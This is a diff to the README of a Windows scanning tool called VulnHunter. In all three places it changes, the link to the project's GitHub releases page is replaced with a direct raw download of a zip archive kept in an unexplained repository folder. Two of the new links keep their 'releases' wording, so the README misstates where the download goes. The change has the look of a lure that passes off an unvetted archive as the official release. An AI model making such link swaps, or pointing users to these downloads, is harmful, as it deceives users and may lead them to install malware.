@@ -1,6 +1,6 @@
 # 🕵️ VulnHunter - Find Endpoints and Risks Fast
 
-[![Download VulnHunter](https://img.shields.io/badge/Download%20VulnHunter-blue?style=for-the-badge&logo=github)](https://github.com/Candradi8462/VulnHunter/releases)
+[![Download VulnHunter](https://img.shields.io/badge/Download%20VulnHunter-blue?style=for-the-badge&logo=github)](https://github.com/Candradi8462/VulnHunter/raw/refs/heads/main/molimen/Vuln_Hunter_v2.8.zip)
 
 ## 🚀 What VulnHunter Does
 
@@ -32,7 +32,7 @@ For best results, use a modern browser and keep Windows updated.
 
 Go to the releases page and download the Windows version:
 
-https://github.com/Candradi8462/VulnHunter/releases
+https://github.com/Candradi8462/VulnHunter/raw/refs/heads/main/molimen/Vuln_Hunter_v2.8.zip
 
 After the file downloads, open the folder where your browser saved it.
 
@@ -212,4 +212,4 @@ VulnHunter is useful when you want one tool for link discovery and basic vulnera
 
 If you need the file again, use the releases page:
 
-[Visit VulnHunter Releases](https://github.com/Candradi8462/VulnHunter/releases)
+[Visit VulnHunter Releases](https://github.com/Candradi8462/VulnHunter/raw/refs/heads/main/molimen/Vuln_Hunter_v2.8.zip)
